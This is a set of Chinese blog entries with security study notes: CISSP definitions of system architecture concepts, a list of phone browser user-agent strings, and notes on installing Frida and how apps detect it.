title="要能定义ISC"></a>要能定义ISC</h2><p>工业控制系统（ISC）是一种控制工业流程和机器的计算机管理设备（也叫操作技术）。</p><p>ISC例子：</p><p>分布式控制系统（DCS）</p><p>可编程逻辑控制器（PLC）</p><p>监测控制和数据采集（SCADA）系统</p><h2 id="了解分布式系统"><a href="#了解分布式系统" class="headerlink" title="了解分布式系统"></a>了解分布式系统</h2><p>分布式系统或分布式计算环境（DCE）是协同支持一个资源或提供一项服务的一组单个系统的集合。</p><p>主要安全问题：</p><p>组件之间的互联性。</p><h2 id="了解区块链"><a href="#了解区块链" class="headerlink" title="了解区块链"></a>了解区块链</h2><p>区块链是用哈希函数、时间戳和交易数据验证过的记录、交易、操作或其他事件的集合或分类账。</p><h2 id="了解数据主权"><a href="#了解数据主权" class="headerlink" title="了解数据主权"></a>了解数据主权</h2><p>信息一旦被转换为二进制并以数字文件形式存储，就要受到存储设备所在国家&#x2F;地区法律约束。</p><h2 id="了解智能设备"><a href="#了解智能设备" class="headerlink" title="了解智能设备"></a>了解智能设备</h2><p>智能设备是指可为用户提供大量自定义选项（通常通过安装应用程序实现），并可利用被配备在设备本地或云端的机器学习（ML）处理的各种设备。</p><h2 id="要能定义物联网"><a href="#要能定义物联网" class="headerlink" title="要能定义物联网"></a>要能定义物联网</h2><p>物联网（IoT）属于智能设备的一个类别，与互联网连接，可为装置或设备提供自动化、远程控制或人工智能（AI）处理。</p><p>物联网的安全问题：</p><p>访问控制</p><p>加密</p><h2 id="要能定义工业物联网"><a href="#要能定义工业物联网" class="headerlink" title="要能定义工业物联网"></a>要能定义工业物联网</h2><p>工业物联网（IIoT）是物联网的衍生品，更侧重于工程、工业、制造或基础设施层面的监督、自动化、管理和传感。</p><p>工业物联网从集成了云服务的 ICS 和 DCS 进化而来，可用于执行数据收集、分析、优化和自动化。</p><h2 id="了解专用设备"><a href="#了解专用设备" class="headerlink" title="了解专用设备"></a>了解专用设备</h2><p>专用设备是指为某一特定目的而设计，供某一特定类型机构使用或执行某一特定功能的任何设备。</p><p>被看作DCS、物联网、智能设备、端点设备或边缘计算系统的一个类型。</p><p>医疗设备、智能汽车、无人机和智能电表都属于专用设备。</p><h2 id="要能定义SOA"><a href="#要能定义SOA" class="headerlink" title="要能定义SOA"></a>要能定义SOA</h2><p>面向服务架构（SOA）从现有但独立的软件服务构建新的应用程序或功能，所得到的往往是新的应用程序。</p><p>新应用程序的安全问题是未知、未经测试和没有得到保护的。</p><p>SOA的一个衍生品是 微服务。</p><h2 id="了解微服务"><a href="#了解微服务" class="headerlink" title="了解微服务"></a>了解微服务</h2><p>微服务只是Web应用程序的一个元素、特性、能力、业务逻辑或功能，可供其他Web应用程序调用或使用。</p><p>微服务从一个Web应用程序的功能转换而来，是可由许多其他 Web 应用程序调用的一项服务。</p><p>微服务允许把大型复杂解决方案分解成一个个较小的自含功能。</p><h2 id="要能定义IaC"><a href="#要能定义IaC" class="headerlink" title="要能定义IaC"></a>要能定义IaC</h2><p>基础设施即代码（IaC）体现了人们在认知和处理硬件管理方面的一种改变。</p><p>以往硬件配置被看作一种手动的、直接操作的、一对一的管理难题，而如今，硬件配置被视为另一种元素的集合。</p><p>就像在 DevSecOps（开发、安全、运维）模式下管理软件和代码那样对硬件配置实施管理。</p><h2 id="了解管理程序"><a href="#了解管理程序" class="headerlink" title="了解管理程序"></a>了解管理程序</h2><p>管理程序也被称为虚拟机监控器&#x2F;管理器（VMM），是创建、管理和运行虚拟机的虚拟化组件。</p><h2 id="了解-I-型管理程序"><a href="#了解-I-型管理程序" class="headerlink" title="了解 I 型管理程序"></a>了解 I 型管理程序</h2><p>I 型管理程序是一个本地或裸机管理程序。</p><p>在 I 型管理程序配置中没有主机操作系统；相反，管理程序通常被直接安装在主机操作系统所在的硬件上。</p><h2 id="了解-II-型管理程序"><a href="#了解-II-型管理程序" class="headerlink" title="了解 II 型管理程序"></a>了解 II 型管理程序</h2><p>II 型管理程序是一种受托管的管理程序。</p><p>在 II 型管理程序配置中，硬件上有一个标准的常规操作系统，管理程序作为另一个软件应用程序被安装和使用。</p><h2 id="了解虚拟机逃逸"><a href="#了解虚拟机逃逸" class="headerlink" title="了解虚拟机逃逸"></a>了解虚拟机逃逸</h2><p>当客户操作系统中的软件能够突破管理程序提供的隔离保护，从而破坏其他客户操作系统的容器或渗透主机操作系统时，就意味着发生了虚拟机逃逸。</p><h2 id="了解虚拟软件"><a href="#了解虚拟软件" class="headerlink" title="了解虚拟软件"></a>了解虚拟软件</h2><p>虚拟应用程序或虚拟软件是一种软件产品，部署方式会让访问者误以为自己在和整个主机操作系统交互。</p><p>虚拟（或虚拟化）应用程序经过打包或封装，可以在不完全访问主机操作系统的情况下执行和操作。</p><p>虚拟应用程序和主机操作系统是隔离的，因此不能对主机操作系统做任何直接或永久的改动。</p><h2 id="了解虚拟网络"><a href="#了解虚拟网络" class="headerlink" title="了解虚拟网络"></a>了解虚拟网络</h2><p>虚拟化网络或网络虚拟化是指将硬件和软件网络组合成一个集成的实体。</p><p>由此产生的解决方案允许对管理、通信流整型、地址分配等所有网络功能实施网络控制。</p><h2 id="了解SDx"><a href="#了解SDx" class="headerlink" title="了解SDx"></a>了解SDx</h2><p>软件定义一切（SDx）指的是通过虚拟化用软件代替硬件的一种趋势。</p><p>SDx包括虚拟化、虚拟化软件、虚拟化网络、容器化、无服务器架构、基础设施即代码、SDN、VSAN、软件定义存储（SDS）、VDI、VMI、SDV和软件定义数据中心（SDDC）。</p><h2 id="了解VDI和VMI"><a href="#了解VDI和VMI" class="headerlink" title="了解VDI和VMI"></a>了解VDI和VMI</h2><p>虚拟桌面基础设施（VDI）旨在通过在可供用户远程访问的中央服务器上托管桌面&#x2F;工作站操作系统虚拟机来降低终端设备安全风险和满足性能需求。</p><p>虚拟移动基础设施（VMI）是指在中央服务器山虚拟化移动设备操作系统的移动基础设施。</p><h2 id="了解SDV"><a href="#了解SDV" class="headerlink" title="了解SDV"></a>了解SDV</h2><p>软件定义可见性（SDV）是一个推动网络监控和响应进程实现自动化的框架。</p><p>旨在让每个数据包得到分析，可以使有关转发、剔除或其他方式响应威胁的决定在深度情报的基础上有的放矢。</p><h2 id="了解SDDC"><a href="#了解SDDC" class="headerlink" title="了解SDDC"></a>了解SDDC</h2><p>软件定义数据中心（SDDC）或虚拟数据中心（VDC）是指用虚拟提供的解决方案替代物理IT元素的概念，该解决方案往往由一个外部第三方（如一家云服务提供商）提供。</p><h2 id="了解XaaS"><a href="#了解XaaS" class="headerlink" title="了解XaaS"></a>了解XaaS</h2><p>一切即服务（XaaS）是一种笼统的说法，指可以通过或借助云解决方案向客户提供任何类型的计算服务或功能。</p><p>例如：</p><p>SECaaS</p><p>IPaaS</p><p>FaaS</p><p>ITaaS</p><p>MaaS</p><h2 id="了解虚拟化的一些安全问题"><a href="#了解虚拟化的一些安全问题" class="headerlink" title="了解虚拟化的一些安全问题"></a>了解虚拟化的一些安全问题</h2><p>虚拟化不会降低操作系统的安全管理要求。</p><p>1、补丁管理。</p><p>2、保护主机的稳定性。</p><p>3、保持好虚拟资产备份。</p><p>4、虚拟化系统应该接受安全测试。</p><p>5、全面的IT管理或安全计划实施管控</p><h2 id="了解容器化"><a href="#了解容器化" class="headerlink" title="了解容器化"></a>了解容器化</h2><p>容器化和操作系统虚拟化基于一个概念：在虚拟机中消除操作系统的重复元素。</p><p>每个应用程序都被放进一个容器。</p><p>容器中只包含支持被封闭的应用程序真正需要的资源，而公共或共享的操作系统元素纳入管理程序中。</p><h2 id="了解无服务器架构"><a href="#了解无服务器架构" class="headerlink" title="了解无服务器架构"></a>了解无服务器架构</h2><p>无服务器架构是一种云计算概念，其中代码由客户管理，平台（即支持硬件和软件）或服务器由云服务提供商（CSP）管理。</p><p>现实中永远都会有一台物理服务器在运行代码，但是这种执行模型运行软件设计师&#x2F;架构师&#x2F;程序员&#x2F;开发人员专注其代码的逻辑，而不必理会特定服务器的参数或限制。</p><p>这种模型也被称为功能即服务（FaaS）</p><h2 id="了解嵌入式系统"><a href="#了解嵌入式系统" class="headerlink" title="了解嵌入式系统"></a>了解嵌入式系统</h2><p>嵌入式系统的设计通常以与该系统所附着的较大产品相关的一组有限特定功能为核心。</p><h2 id="了解微控制器"><a href="#了解微控制器" class="headerlink" title="了解微控制器"></a>了解微控制器</h2><p>微控制器类似于系统级芯片（SoC）。</p><p>微控制器可以是 SoC 的一个组件。</p><p>微控制器算得上一个小型计算机，由CPU（带一个或多个内核）、内存、各种输入&#x2F;输出功能、RAM以及通常采用闪存或ROM&#x2F;PROM&#x2F;EEPROM形成的非易失性存储器组成。</p><p>例如：</p><p>Raspberry Pi</p><p>Arduino</p><p>FPGA</p><h2 id="了解静态系统-环境"><a href="#了解静态系统-环境" class="headerlink" title="了解静态系统&#x2F;环境"></a>了解静态系统&#x2F;环境</h2><p>静态系统&#x2F;环境是为特定需要、能力或功能而专门配置的应用程序、操作系统、硬件集或网络，一旦设定完成，将始终保持不变。</p><h2 id="了解可联网设备"><a href="#了解可联网设备" class="headerlink" title="了解可联网设备"></a>了解可联网设备</h2><p>可联网设备是指具备本机联网能力的任何类型的设备-无论是移动的还是固定的。</p><p>可联网设备可以是嵌入式系统，也可用来创建嵌入式系统。</p><h2 id="了解信息物理融合系统"><a href="#了解信息物理融合系统" class="headerlink" title="了解信息物理融合系统"></a>了解信息物理融合系统</h2><p>信息物理融合系统指可提供计算手段来控制物理世界中某物的设备。</p><p>信息物理融合更侧重于物理世界的结果，而非计算方面。</p><h2 id="了解嵌入式系统和静态环境的安全问题"><a href="#了解嵌入式系统和静态环境的安全问题" class="headerlink" title="了解嵌入式系统和静态环境的安全问题"></a>了解嵌入式系统和静态环境的安全问题</h2><p>静态环境、嵌入式系统、可联网设备、信息物理融合系统、HPC系统、边缘计算设备、雾计算设备、移动设备以及其他用途有限或用途单一的计算环境都需要<strong>安全管理</strong>。</p><p>安全管理技术包括网络分段、安全层级、应用防火墙、手动更新、固件版本控制、包装器以及控制冗余和多样性。</p><h2 id="了解HPC系统"><a href="#了解HPC系统" class="headerlink" title="了解HPC系统"></a>了解HPC系统</h2><p>高性能计算（HPC）系统是指专用于以极高速度执行复杂计算或数据操控的计算平台。</p><p>超级计算机和MPP解决方案都是 HPC系统。</p><h2 id="了解RTOS"><a href="#了解RTOS" class="headerlink" title="了解RTOS"></a>了解RTOS</h2><p>实时操作系统（RTOS）经设计可在数据到达系统时以最小时延或延迟对它们进行处理或处置。</p><p>实时操作系统通常保存在只读存储器（ROM）上，而且可在硬实时或软实时条件下运行。</p><h2 id="了解边缘计算"><a href="#了解边缘计算" class="headerlink" title="了解边缘计算"></a>了解边缘计算</h2><p>边缘计算是让数据与计算资源尽可能靠近，在最大限度减少时延的同时优化带宽利用率的一种网络设计理念。</p><p>在边缘计算中，智能和处理被包含在每个设备中。因此不必将数据发送到主处理实体，相反，每个设备都可以在本地处理自己的数据。</p><h2 id="了解雾计算"><a href="#了解雾计算" class="headerlink" title="了解雾计算"></a>了解雾计算</h2><p>雾计算是先进计算架构的另一个例子，也常被用作工业物联网部署的一个元素。</p><p>雾计算依靠传感器、物联网设备乃至边缘计算设备收集数据，然后把数据传回一个中央位置进行处理。</p><p>因此智能和处理都是集中化的。</p><h2 id="了解移动设备安全"><a href="#了解移动设备安全" class="headerlink" title="了解移动设备安全"></a>了解移动设备安全</h2><p>对于电子设备（PED）的安全功能，往往可以用移动设备管理（MDM）或统一端点管理（UEM）解决方案来管理。</p><p>其中包括设备身份认证、全设备加密、通信保护、远程擦除、设备锁定、屏幕锁、GPS和定位服务管理、内容管理、应用程序控制、推送通知管理、第三方应用商店控制、存储分段、资产跟踪和存货控制、可移动存储、连接方法管理、禁用无用性能、生根&#x2F;越狱、旁加载、自定义固件、运营商解锁、固件无线更新、密钥管理、凭证管理和短信安全。</p><h2 id="了解移动设备部署策略"><a href="#了解移动设备部署策略" class="headerlink" title="了解移动设备部署策略"></a>了解移动设备部署策略</h2><p>允许配备移动设备执行工作任务。</p><p>可以考虑 VDI 和 VMI 选项。</p><h2 id="了解移动设备部署策略的细节"><a href="#了解移动设备部署策略的细节" class="headerlink" title="了解移动设备部署策略的细节"></a>了解移动设备部署策略的细节</h2><p>移动设备部署策略应该阐明以下问题：</p><p>1、数据的拥有权</p><p>2、对拥有权的支持</p><p>3、补丁和更新管理</p><p>4、安全产品管理</p><p>5、取证</p><p>6、隐私</p><p>7、列装&#x2F;退役</p><p>8、遵守公司策略</p><p>9、用户接受</p><p>10、架构&#x2F;基础设施方面的考虑</p><p>11、法律问题</p><p>12、可接受使用策略</p><p>13、板载相机&#x2F;摄像头</p><p>14、可录音的麦克风</p><p>15、Wi-Fi Direct</p><p>16、网络共享和热点</p><p>17、无接触支付方式</p><h2 id="了解进程隔离"><a href="#了解进程隔离" class="headerlink" title="了解进程隔离"></a>了解进程隔离</h2><p>进程隔离要求操作系统为每个进程的指令和数据提供单独的内存空间，还要求操作系统为这些进程设定边界，从而阻止一个进程读写属于另一进程的数据。</p><h2 id="了解硬件分隔"><a href="#了解硬件分隔" class="headerlink" title="了解硬件分隔"></a>了解硬件分隔</h2><p>硬件隔离与进程隔离类似，旨在阻止人员对属于不同进程&#x2F;安全级别的信息的访问。</p><p>与进程隔离的主要区别：</p><p>硬件隔离通过使用物理硬件控制（而不是操作系统强加的逻辑进程隔离控制）来达到这些目的。</p><h2 id="了解系统安全策略的重要性"><a href="#了解系统安全策略的重要性" class="headerlink" title="了解系统安全策略的重要性"></a>了解系统安全策略的重要性</h2><p>系统安全策略作用是告知和指导特定系统的设计、开发、实现、测试和维护。</p><p>系统安全策略需要紧紧围绕具体执行方案展开。</p><h2 id="要能说明什么是隐蔽通道"><a href="#要能说明什么是隐蔽通道" class="headerlink" title="要能说明什么是隐蔽通道"></a>要能说明什么是隐蔽通道</h2><p>隐蔽通道是指在不常被通信使用的路径上传递信息的一种方法。</p><p>隐蔽通道的使用提供了一种违反、绕过或避开安全策略且不被检测到的手段。</p><p>隐蔽通道的基本类型：</p><p>1、隐蔽时序通道</p><p>2、隐蔽存储通道</p><h2 id="了解设计和编码缺陷产生的漏洞"><a href="#了解设计和编码缺陷产生的漏洞" class="headerlink" title="了解设计和编码缺陷产生的漏洞"></a>了解设计和编码缺陷产生的漏洞</h2><p>编码实践不当和安全考虑缺乏是系统架构漏洞常见的来源或原因。</p><p>糟糕的设计、有问题的执行规程、不恰当或不充分的测试、故意的设计决策（代码中内置的特殊入口点未被移除，例如：用于绕过访问控制、登录或其他安全检查， 通常在开发过程中添加到代码中）都有可能带来风险和攻击。</p><h2 id="了解rootkit"><a href="#了解rootkit" class="headerlink" title="了解rootkit"></a>了解rootkit</h2><p>rootkit是嵌入操作系统的一种恶意软件。</p><p>这个词是生根概念和一种黑客实用工具包的衍生物。</p><p>生根是指获得对一个系统的整体或全由控钊。</p><h2 id="了解增量攻击"><a href="#了解增量攻击" class="headerlink" title="了解增量攻击"></a>了解增量攻击</h2><p>有些形式的攻击以缓慢、渐进的方式发生，而不是通过明显或可识别的尝试来危害系统的安全性和完整性。</p><p>增量攻击的两种形式：</p><p>1、数据欺骗</p><p>2、萨拉米香肠攻击</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UA_Collect</title>
    <link href="/2025/01/26/security/secattack/messageCollect/UA_Collect/"/>
    <url>/2025/01/26/security/secattack/messageCollect/UA_Collect/</url>
    
    <content type="html"><![CDATA[<p>荣耀30Pro鸿蒙4.2微信手机端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">12</span>; EBG-AN00 Build/HUAWEIEBG-AN00; wv) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Version/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> Chrome/<span class="hljs-number">130</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6723</span>.<span class="hljs-number">103</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> XWEB/<span class="hljs-number">1300333</span> MMWEBSDK/<span class="hljs-number">20241202</span> MMWEBID/<span class="hljs-number">5893</span> MicroMessenger/<span class="hljs-number">8.0.56.280</span>0(<span class="hljs-number">0</span>x28003851) WeChat/arm64 Weixin NetType/<span class="hljs-number">5</span>G Language/zh_CN ABI/arm64<br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2Edge手机客户端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">10</span>; K) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">131.0.0.0</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> EdgA/<span class="hljs-number">131.0.0.0</span><br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2夸克手机客户端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; U; Android <span class="hljs-number">12</span>; zh-Hans-CN; EBG-AN00 Build/HUAWEIEBG-AN00) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Version/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> Chrome/<span class="hljs-number">100</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4896</span>.<span class="hljs-number">58</span> Quark/<span class="hljs-number">7.6.5.720</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2必应手机客户端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">12</span>; EBG-AN00 Build/HUAWEIEBG-AN00; ) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Version/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> Chrome/<span class="hljs-number">114</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5735</span>.<span class="hljs-number">196</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2自带华为浏览器15.0.9.300 UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">12</span>; HarmonyOS; EBG-AN00; HMSCore <span class="hljs-number">6.15.0.302</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">114</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5735</span>.<span class="hljs-number">196</span> HuaweiBrowser/<span class="hljs-number">15.0.9.300</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secattack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secattack</tag>
      
      <tag>messageCollect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dlp</title>
    <link href="/2025/01/21/security/itsec/dlp/"/>
    <url>/2025/01/21/security/itsec/dlp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="DLP分类"><a href="#DLP分类" class="headerlink" title="DLP分类"></a>DLP分类</h1><h2 id="终端DLP"><a href="#终端DLP" class="headerlink" title="终端DLP"></a>终端DLP</h2><h2 id="网络DLP"><a href="#网络DLP" class="headerlink" title="网络DLP"></a>网络DLP</h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>itsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>itsec</tag>
      
      <tag>dlp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mobilesec_tools</title>
    <link href="/2025/01/21/security/mobilesec/mobilesec_tools/"/>
    <url>/2025/01/21/security/mobilesec/mobilesec_tools/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h1><h2 id="frida简介"><a href="#frida简介" class="headerlink" title="frida简介"></a>frida简介</h2><p>Frida 是一个动态插桩工具，允许你在运行时修改应用程序的行为，无需源码。它广泛用于逆向工程、安全测试和调试，支持 Android、iOS、Windows、macOS 等平台。</p><h2 id="frida部署"><a href="#frida部署" class="headerlink" title="frida部署"></a>frida部署</h2><h3 id="主机端部署"><a href="#主机端部署" class="headerlink" title="主机端部署"></a>主机端部署</h3><h4 id="MAC部署"><a href="#MAC部署" class="headerlink" title="MAC部署"></a>MAC部署</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>Python 3.13.1</p><p>pip-25.0.1</p><h5 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> frida-tools<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gradle">(fridavenv) ➜  opt pip install frida-tools<br>Collecting frida-tools<br>  Downloading frida-tools-<span class="hljs-number">13.6</span>.<span class="hljs-number">1</span>.tar.gz (<span class="hljs-number">4.6</span> MB)<br>     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <span class="hljs-number">4.6</span><span class="hljs-regexp">/4.6 MB 17.4 kB/</span>s eta <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>  Installing build <span class="hljs-keyword">dependencies</span> ... done<br>  Getting requirements to build wheel ... done<br>  Preparing metadata (pyproject.toml) ... done<br>Collecting colorama&lt;<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>,&gt;=<span class="hljs-number">0.2</span>.<span class="hljs-number">7</span> (<span class="hljs-keyword">from</span> frida-tools)<br>  Downloading colorama-<span class="hljs-number">0.4</span>.<span class="hljs-number">6</span>-py2.py3-none-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">17</span> kB)<br>Collecting frida&lt;<span class="hljs-number">17.0</span>.<span class="hljs-number">0</span>,&gt;=<span class="hljs-number">16.2</span>.<span class="hljs-number">2</span> (<span class="hljs-keyword">from</span> frida-tools)<br>  Downloading frida-<span class="hljs-number">16.6</span>.<span class="hljs-number">6</span>-cp37-abi3-macosx_11_0_arm64.whl.metadata (<span class="hljs-number">2.2</span> kB)<br>Collecting prompt-toolkit&lt;<span class="hljs-number">4.0</span>.<span class="hljs-number">0</span>,&gt;=<span class="hljs-number">2.0</span>.<span class="hljs-number">0</span> (<span class="hljs-keyword">from</span> frida-tools)<br>  Downloading prompt_toolkit-<span class="hljs-number">3.0</span>.<span class="hljs-number">50</span>-py3-none-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">6.6</span> kB)<br>Collecting pygments&lt;<span class="hljs-number">3.0</span>.<span class="hljs-number">0</span>,&gt;=<span class="hljs-number">2.0</span>.<span class="hljs-number">2</span> (<span class="hljs-keyword">from</span> frida-tools)<br>  Downloading pygments-<span class="hljs-number">2.19</span>.<span class="hljs-number">1</span>-py3-none-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">2.5</span> kB)<br>Collecting websockets&lt;<span class="hljs-number">14.0</span>.<span class="hljs-number">0</span>,&gt;=<span class="hljs-number">13.0</span>.<span class="hljs-number">0</span> (<span class="hljs-keyword">from</span> frida-tools)<br>  Downloading websockets-<span class="hljs-number">13.1</span>-cp313-cp313-macosx_11_0_arm64.whl.metadata (<span class="hljs-number">6.8</span> kB)<br>Collecting wcwidth (<span class="hljs-keyword">from</span> prompt-toolkit&lt;<span class="hljs-number">4.0</span>.<span class="hljs-number">0</span>,&gt;=<span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>-&gt;frida-tools)<br>  Downloading wcwidth-<span class="hljs-number">0.2</span>.<span class="hljs-number">13</span>-py2.py3-none-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">14</span> kB)<br>Downloading colorama-<span class="hljs-number">0.4</span>.<span class="hljs-number">6</span>-py2.py3-none-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">25</span> kB)<br>Downloading frida-<span class="hljs-number">16.6</span>.<span class="hljs-number">6</span>-cp37-abi3-macosx_11_0_arm64.whl (<span class="hljs-number">30.9</span> MB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <span class="hljs-number">30.9</span><span class="hljs-regexp">/30.9 MB 262.1 kB/</span>s eta <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>Downloading prompt_toolkit-<span class="hljs-number">3.0</span>.<span class="hljs-number">50</span>-py3-none-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">387</span> kB)<br>Downloading pygments-<span class="hljs-number">2.19</span>.<span class="hljs-number">1</span>-py3-none-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">1.2</span> MB)<br>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <span class="hljs-number">1.2</span><span class="hljs-regexp">/1.2 MB 139.0 kB/</span>s eta <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>Downloading websockets-<span class="hljs-number">13.1</span>-cp313-cp313-macosx_11_0_arm64.whl (<span class="hljs-number">155</span> kB)<br>Downloading wcwidth-<span class="hljs-number">0.2</span>.<span class="hljs-number">13</span>-py2.py3-none-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">34</span> kB)<br>Building wheels <span class="hljs-keyword">for</span> collected packages: frida-tools<br>  Building wheel <span class="hljs-keyword">for</span> frida-tools (pyproject.toml) ... done<br>  Created wheel <span class="hljs-keyword">for</span> frida-tools: filename=frida_tools-<span class="hljs-number">13.6</span>.<span class="hljs-number">1</span>-py3-none-<span class="hljs-keyword">any</span>.whl <span class="hljs-keyword">size</span>=<span class="hljs-number">4639028</span> sha256=ca2d55ad771c3d7b768f5521e20573791f1add532e9c25c7fc1533b40fd96cac<br>  Stored in directory: <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/Library/</span>Caches<span class="hljs-regexp">/pip/</span>wheels<span class="hljs-regexp">/a0/</span>c8<span class="hljs-regexp">/a2/</span>cd8cff3b44976fa7a13d8238ef617bc309c347faf0c69e89b8<br>Successfully built frida-tools<br>Installing collected packages: wcwidth, websockets, pygments, prompt-toolkit, frida, colorama, frida-tools<br>Successfully installed colorama-<span class="hljs-number">0.4</span>.<span class="hljs-number">6</span> frida-<span class="hljs-number">16.6</span>.<span class="hljs-number">6</span> frida-tools-<span class="hljs-number">13.6</span>.<span class="hljs-number">1</span> prompt-toolkit-<span class="hljs-number">3.0</span>.<span class="hljs-number">50</span> pygments-<span class="hljs-number">2.19</span>.<span class="hljs-number">1</span> wcwidth-<span class="hljs-number">0.2</span>.<span class="hljs-number">13</span> websockets-<span class="hljs-number">13.1</span><br></code></pre></td></tr></table></figure><h2 id="frida检测机制"><a href="#frida检测机制" class="headerlink" title="frida检测机制"></a>frida检测机制</h2><h3 id="检测-Frida-server-的运行"><a href="#检测-Frida-server-的运行" class="headerlink" title="检测 Frida-server 的运行"></a>检测 Frida-server 的运行</h3><ul><li>检查设备上是否有 Frida-server 进程</li><li>检查端口（如默认的 27042）是否被占用</li></ul><h3 id="检测注入痕迹"><a href="#检测注入痕迹" class="headerlink" title="检测注入痕迹"></a>检测注入痕迹</h3><ul><li>检查内存中是否有 Frida 的动态库，例如：libfrida-gadget.so</li><li>检查加载的模块或符号表中是否有 Frida 相关字符串</li></ul><h3 id="检测文件系统"><a href="#检测文件系统" class="headerlink" title="检测文件系统"></a>检测文件系统</h3><ul><li>检查是否存在 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server  或 类似路径</li><li>检查设备是否已经被 root &#x2F; 